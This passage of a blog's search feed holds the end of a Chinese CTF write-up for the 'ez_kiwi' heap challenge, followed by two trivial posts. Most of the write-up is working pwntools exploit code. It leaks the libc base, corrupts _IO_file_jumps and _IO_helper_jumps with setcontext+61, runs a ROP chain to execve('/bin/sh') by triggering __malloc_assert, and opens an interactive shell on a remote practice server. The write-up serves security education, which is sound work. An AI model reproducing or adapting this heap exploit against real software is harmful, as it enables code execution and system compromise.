class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure><p>使用ROPgadget 找到相应的gadget，利用系统调用去执行execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) （储存&#x2F;bin&#x2F;sh的地址自己找好偏移即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br></code></pre></td></tr></table></figure><p>继续利用0x20大小的堆块重叠，去修改<code>_IO_helper_jumps + 0xa0 和 _IO_helper_jumps + 0xa8</code>中的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br></code></pre></td></tr></table></figure><p>关于触发<code>__malloc_assert</code>：在top chunk不够使用时就使用sysmalloc，同时对top chunk进行一系列检查，这里我们不是为了绕过检查，而是故意让其不能通过检查。这里改变top chunk的大小，使其不能页对齐，并使用gift()函数申请0x25000大小的堆块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br></code></pre></td></tr></table></figure><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ez_kiwi&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ez_kiwi&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27690</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;give me your name:\n&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;How much do you want?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to put?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Tell me your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to remove?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to look?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Which one do you want to change?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Change your idea:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;666&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(<span class="hljs-number">0xb0</span>, i, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">7</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-number">9</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\xc1&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    delete(i)<br>delete(<span class="hljs-number">9</span>)<br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br><br>leak = u64( p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_file_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>IO_helper_jumps = libcbase + <span class="hljs-number">2017632</span> - <span class="hljs-number">0xc0</span><br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">3</span>)<br>delete(<span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, p64(IO_file_jumps + <span class="hljs-number">0x60</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">4</span>, p64(setcontext + <span class="hljs-number">61</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">3</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[-<span class="hljs-number">8</span>:-<span class="hljs-number">2</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>ret = libcbase + <span class="hljs-number">0x25679</span><br>pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c371</span><br>syscall = libcbase + <span class="hljs-number">0x2584d</span><br>rop = p64(pop_rdx_r12) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi) <br>rop += p64(heap_addr + <span class="hljs-number">0x30</span>) +p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>) +p64(syscall)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, rop)<br>edit(<span class="hljs-number">2</span>, p64(IO_helper_jumps + <span class="hljs-number">0xa0</span>)+ <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-number">5</span>, p64(heap_addr -<span class="hljs-number">0x1b0</span>) + p64(ret))<br><span class="hljs-comment">#add(0x80, 9, b&#x27;a&#x27;)</span><br><br>add(<span class="hljs-number">0x28</span>, <span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="hljs-number">2</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span>+ <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>, payload)<br>gift()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p> 参考：<a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/11/01/Hello-world/"/>
    <url>/2022/11/01/Hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello World</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/10/31/2022-10-31/"/>
    <url>/2022/10/31/2022-10-31/</url>
    
    <content type="html"><![CDATA[<h2 id="2022-10-31"><a href="#2022-10-31" class="headerlink" title="2022-10-31"></a>2022-10-31</h2><p><strong>Happy halloween</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
